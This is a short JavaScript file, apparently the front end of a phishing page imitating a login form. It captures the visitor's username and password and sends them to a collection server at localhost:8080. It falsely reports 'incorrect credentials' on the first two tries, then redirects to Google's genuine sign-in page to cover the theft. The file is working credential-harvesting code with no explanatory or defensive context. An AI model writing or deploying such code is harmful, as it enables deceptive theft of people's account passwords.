let attemptCount = 0;

document.getElementById("loginForm").addEventListener("submit", async (e) => {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    attemptCount++;

    const response = await fetch("http://localhost:8080/", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ username, password })
    });

    if (attemptCount < 3) {
        alert("Credenciales incorrectas. Por favor, inténtalo de nuevo.");
    } else {
        // Redirigir a la página de login de Google después del tercer intento
        window.location.href = "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.google.com%2Fwebhp%3Fauthuser%3D1&ec=GAlAmgQ&hl=es&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S1142059354%3A1724181348196689&ddm=0";
    }

    const data = await response.json();
    console.log(data.msg);
});
